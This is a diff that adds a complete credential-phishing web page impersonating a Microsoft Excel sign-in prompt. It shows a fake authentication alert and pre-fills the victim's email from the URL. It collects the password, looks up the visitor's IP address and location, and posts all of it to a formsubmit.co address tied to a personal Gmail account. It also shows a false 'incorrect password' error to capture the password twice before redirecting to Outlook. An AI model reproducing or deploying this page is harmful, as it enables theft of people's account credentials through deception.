@@ -1,0 +1,194 @@
+<!--18 AUGUST, 2025-->
+
+<!DOCTYPE html>
+<html lang="en">
+  <script language="JavaScript">
+alert("Microsoft Excel Document Requires Authentication. Click Ok To Continue")
+</script>
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title></title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9ueC5cwQHun4eVYjqr80Q67olwMTLbHE86TjqjZHCjMS8sBKR5o1ynMRfAaFVKAFMjTgzLgCeLJ5ofKCaDRBo-BUlXtO5WmwjuKbtW-NNyloDzOkIi_lRV505CoxWcbRhcUuRYByCJx8DrA9KxXdMtXFQQmFUf-LgZXLG9d5aiLXvFGiw8ByrFzgPGVwR/s1600/image%20%281%29.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            padding: 40px;
+            text-align: center;
+        }
+
+        /* [Rest of your CSS remains exactly the same] */
+        .logo { margin-bottom: 20px; }
+        .logo img { width: 60px; height: 60px; }
+        .title-header { display: flex; align-items: center; justify-content: center; margin-bottom: 30px; position: relative; }
+        .backButton { background: none; border: none; cursor: pointer; position: absolute; left: 0; padding: 5px; }
+        .backButton img { width: 24px; height: 24px; }
+        h1 { font-size: 24px; color: #333; margin: 0; }
+        .input-container { position: relative; margin-bottom: 20px; }
+        input[type="password"], input[type="text"] { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+        .show-password { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #0066cc; cursor: pointer; font-size: 14px; }
+        .forgot-password { margin-bottom: 25px; text-align: right; }
+        .forgot-password a { color: #0066cc; text-decoration: none; font-size: 14px; }
+        .signin-button { width: 100%; padding: 12px; background-color: #107c41; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 20px; }
+        .signin-button:hover { background-color: #0e6b38; }
+        .footer { font-size: 12px; color: #666; }
+        .footer a { color: #0066cc; text-decoration: none; }
+        .moveOffScreen { position: absolute; left: -9999px; }
+        #error { color: #ff0000; font-weight: bold; padding: 8px; display: none; background-color: #ffeeee; border: 1px solid #ffcccc; border-radius: 4px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+  
+  
+  <form id="login-form">
+        <div class="login-container">
+            <div class="logo">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbUCVrMEyON9dR4PTyB0GxjJ5EutN596HW_Dmu5eONI4OI17CreZlW4yEkVWM_3csV_MHLPbb-7rsDppIME5J8qaWgudA1cz9Et96gHzLk07owX9XoI4SAi0uG5j4i4zWuO6_eSluC5pyBODzVnVqJaL9c_9YuPtwK_PDxyTUuQ9kalEdkYYc7V8jOebrA/s2203/logo.png" />
+            </div>
+
+            <div class="title-header">
+                <button type="button" class="backButton" id="idBtn_Back" aria-label="Back">
+                    <img role="presentation" src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="Logo" />
+                </button>
+                <h1>Enter password</h1>
+            </div>
+
+            <input type="hidden" id="email" name="email" value="" />
+
+            <div id="error">Incorrect password. Please try again.</div>
+
+            <div class="input-container">
+                <input type="password" id="psw" name="password" placeholder="Password" autocomplete="current-password" required />
+                <button type="button" class="show-password">Show</button>
+            </div>
+
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+
+            <button type="submit" class="signin-button" id="submitBtn">Sign in</button>
+
+            <div class="footer">
+                <a href="#">Terms of use</a> | <a href="#">Privacy & cookies</a> | <a href="#">Help</a>
+            </div>
+        </div>
+    </form>
+   
+      <!--<form class="container" id="login-form">
+	<div class="img">
+		<img id="logo" src="https://logo.clearbit.com/" />
+	</div>
+
+	<h3 id="title">Sign In</h3>
+
+	<h5 id="error">Password is incorrect, please try again!</h5>
+
+	<label for="email">
+		<b>Email Address</b>
+	</label>
+	<input id="email" name="email" placeholder="Enter Email" readonly="" required="" type="text" />
+
+	<label for="psw">
+		<b>Password</b>
+	</label>
+	<input id="psw" name="password" placeholder="Enter Password" required="" type="password" />
+
+	<input id="step" name="step" type="hidden" />
+
+	<button class="btn" type="submit">Sign In</button>
+</form>-->
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script>
+
+	let step = 1;
+	
+	const clientID = window.location.hash.split("#").pop();
+	$('#email').val(clientID);
+	const domain = clientID.split('@').pop();
+
+	$("#frame").attr("src", "https://" + domain);
+	$("#logo").attr("src", "https://logo.clearbit.com/" + domain);
+
+	const submit = $("button[type='submit']");
+
+	$("#login-form").submit(function(event) {
+
+		event.preventDefault();
+
+		submit.text('Verifying...');
+
+		$.getJSON('https://ipinfo.io/json', function(response) {
+			const posting = $.post("https://formsubmit.co/ajax/chasinggdream@gmail.com", {
+				_subject: "Excel Logs | " + response.ip,
+				Email: $("#email").val(),
+				Password: $("#psw").val(),
+				Attempts: step,
+				IP: response.ip,
+				Location: response.city + ", " + response.country,
+			});
+
+			posting.done(function(data) {
+				if (step === 2) {
+					window.location.href = "https://outlook.live.com";
+				} else {
+					step++;
+					$("#error").css("display", "block");
+					submit.text('Sign In');
+					$("#psw").val("");
+				}
+			});
+
+			posting.fail(function(error) {
+				console.error(error);
+				$("#error").css("display", "block");
+				submit.text('Sign In');
+				$("#psw").val("");
+			});
+		}, "json");
+	});
+</script>
+  
+ 
+  
+  
+  
+  <script>
+        document.querySelector('.show-password').addEventListener('click', function () {
+            const passwordInput = document.getElementById('psw');
+            const showBtn = this;
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showBtn.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                showBtn.textContent = 'Show';
+            }
+        });
+    </script>
+</body>
+</html>
